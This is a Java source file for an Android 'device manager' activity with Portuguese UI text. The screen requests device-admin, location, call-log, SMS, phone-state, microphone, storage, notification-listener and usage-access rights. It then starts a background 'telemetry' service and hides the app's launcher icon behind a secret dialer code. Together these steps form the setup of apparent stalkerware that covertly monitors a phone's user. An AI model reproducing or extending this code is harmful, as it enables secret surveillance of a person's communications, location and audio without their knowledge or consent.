package com.company.devicemgr.activities;

import android.Manifest;
import android.app.Activity;
import android.app.AlertDialog;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.TextView;

import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.company.devicemgr.receivers.DeviceAdminReceiver;
import com.company.devicemgr.services.ForegroundTelemetryService;
import com.company.devicemgr.utils.AppRuntime;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class MainPermissionsActivity extends Activity {
    Button btnDeviceAdmin, btnLocationPerm, btnStoragePerm, btnCallLogPerm, btnSmsPerm, btnNotifAccess, btnUsageAccess, btnStartService, btnPickMedia;
    TextView tvStatus, tvDeviceId;
    private static final int REQ_CODE_DEVICE_ADMIN = 1001;
    private static final int REQ_CODE_PERMS = 2001;
    private static final int REQ_PICK_MEDIA = 3001;
    private static final int ANDROID_13_API_LEVEL = 33;
    private static final String READ_MEDIA_IMAGES_PERMISSION = "android.permission.READ_MEDIA_IMAGES";
    private static final String READ_MEDIA_VIDEO_PERMISSION = "android.permission.READ_MEDIA_VIDEO";
    private static final String POST_NOTIFICATIONS_PERMISSION = "android.permission.POST_NOTIFICATIONS";

    @Override
    protected void onCreate(Bundle s) {
        super.onCreate(s);
        setContentView(com.company.devicemgr.R.layout.activity_main_permissions);

        btnDeviceAdmin = findViewById(com.company.devicemgr.R.id.btnDeviceAdmin);
        btnLocationPerm = findViewById(com.company.devicemgr.R.id.btnLocationPerm);
        btnStoragePerm = findViewById(com.company.devicemgr.R.id.btnStoragePerm);
        btnCallLogPerm = findViewById(com.company.devicemgr.R.id.btnCallLogPerm);
        btnSmsPerm = findViewById(com.company.devicemgr.R.id.btnSmsPerm);
        btnNotifAccess = findViewById(com.company.devicemgr.R.id.btnNotifAccess);
        btnUsageAccess = findViewById(com.company.devicemgr.R.id.btnUsageAccess);
        btnStartService = findViewById(com.company.devicemgr.R.id.btnStartService);
        btnPickMedia = findViewById(com.company.devicemgr.R.id.btnPickMedia);

        tvStatus = findViewById(com.company.devicemgr.R.id.tvStatus);
        tvDeviceId = findViewById(com.company.devicemgr.R.id.tvDeviceId);

        final android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        String deviceId = sp.getString("deviceId", null);
        if (deviceId == null) {
            deviceId = UUID.randomUUID().toString();
            sp.edit().putString("deviceId", deviceId).apply();
        }
        tvDeviceId.setText("DeviceId: " + deviceId);

        btnDeviceAdmin.setOnClickListener(v -> {
            DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
            ComponentName adminComp = new ComponentName(MainPermissionsActivity.this, DeviceAdminReceiver.class);
            if (!dpm.isAdminActive(adminComp)) {
                Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComp);
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Necessário para bloqueio temporário e políticas.");
                startActivityForResult(intent, REQ_CODE_DEVICE_ADMIN);
            } else {
                showMsg("Device Admin já activo");
            }
        });

        btnLocationPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.ACCESS_COARSE_LOCATION
        }));

        btnStoragePerm.setOnClickListener(v -> requestPermissionsIfNeeded(getStoragePermissionsForCurrentVersion()));

        btnCallLogPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{Manifest.permission.READ_CALL_LOG}));

        btnSmsPerm.setOnClickListener(v -> requestPermissionsIfNeeded(new String[]{
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.RECORD_AUDIO
        }));

        btnNotifAccess.setOnClickListener(v -> {
            requestNotificationPermissionIfNeeded();
            startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
        });

        btnUsageAccess.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)));

        btnStartService.setOnClickListener(v -> {
            boolean active = sp.getBoolean("active", false);
            if (!active) {
                new AlertDialog.Builder(MainPermissionsActivity.this)
                        .setTitle("Aviso")
                        .setMessage("A conta pode não estar activada. Continua?")
                        .setPositiveButton("Sim", (d, which) -> startTelemetryService())
                        .setNegativeButton("Não", null)
                        .show();
            } else {
                startTelemetryService();
            }
        });

        btnPickMedia.setOnClickListener(v -> {
            Intent i = new Intent(Intent.ACTION_OPEN_DOCUMENT);
            i.addCategory(Intent.CATEGORY_OPENABLE);
            i.setType("*/*");
            i.putExtra(Intent.EXTRA_MIME_TYPES, new String[]{"image/*", "video/*"});
            startActivityForResult(i, REQ_PICK_MEDIA);
        });

        updateStatusText();
    }

    private String[] getStoragePermissionsForCurrentVersion() {
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            return new String[]{READ_MEDIA_IMAGES_PERMISSION, READ_MEDIA_VIDEO_PERMISSION};
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE};
        }
        return new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE};
    }

    private void requestNotificationPermissionIfNeeded() {
        if (Build.VERSION.SDK_INT >= ANDROID_13_API_LEVEL) {
            requestPermissionsIfNeeded(new String[]{POST_NOTIFICATIONS_PERMISSION});
        }
    }

    private void startTelemetryService() {
        requestNotificationPermissionIfNeeded();
        AppRuntime.ensureTelemetryStarted(this);
        showMsg("Serviço iniciado");
        updateStatusText();

        getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putBoolean("setup_completed", true).apply();
        AppRuntime.setLauncherVisible(this, false);
        new AlertDialog.Builder(this)
                .setTitle("Configuração concluída")
                .setMessage("Aplicação ocultada. Para reabrir, use o código no discador: *#*#8466#*#*")
                .setPositiveButton("OK", (d, w) -> finishAffinity())
                .show();
    }

    private void showMsg(String m) {
        tvStatus.setText("Status: " + m);
    }

    private void updateStatusText() {
        android.content.SharedPreferences sp = getSharedPreferences("devicemgr_prefs", MODE_PRIVATE);
        String token = sp.getString("auth_token", null);
        String deviceId = sp.getString("deviceId", null);
        tvStatus.setText("Token: " + (token != null ? "OK" : "missing"));
        tvDeviceId.setText("DeviceId: " + deviceId);
    }

    private void requestPermissionsIfNeeded(String[] perms) {
        List<String> need = new ArrayList<>();
        for (String p : perms) {
            if (ContextCompat.checkSelfPermission(this, p) != PackageManager.PERMISSION_GRANTED) {
                need.add(p);
            }
        }
        if (!need.isEmpty()) {
            ActivityCompat.requestPermissions(this, need.toArray(new String[0]), REQ_CODE_PERMS);
        } else {
            showMsg("Permissões já concedidas");
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (requestCode == REQ_CODE_DEVICE_ADMIN) {
            if (resultCode == RESULT_OK) {
                showMsg("Device Admin activado");
            } else {
                showMsg("Device Admin não activado");
            }
        } else if (requestCode == REQ_PICK_MEDIA && resultCode == RESULT_OK && data != null) {
            Uri uri = data.getData();
            if (uri != null) {
                showMsg("Media seleccionada: " + uri.toString());
                getSharedPreferences("devicemgr_prefs", MODE_PRIVATE).edit().putString("last_media_uri", uri.toString()).apply();
            }
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQ_CODE_PERMS) {
            boolean ok = true;
            for (int r : grantResults) {
                if (r != PackageManager.PERMISSION_GRANTED) {
                    ok = false;
                    break;
                }
            }
            showMsg(ok ? "Permissões concedidas" : "Algumas permissões não concedidas");
        }
    }
}
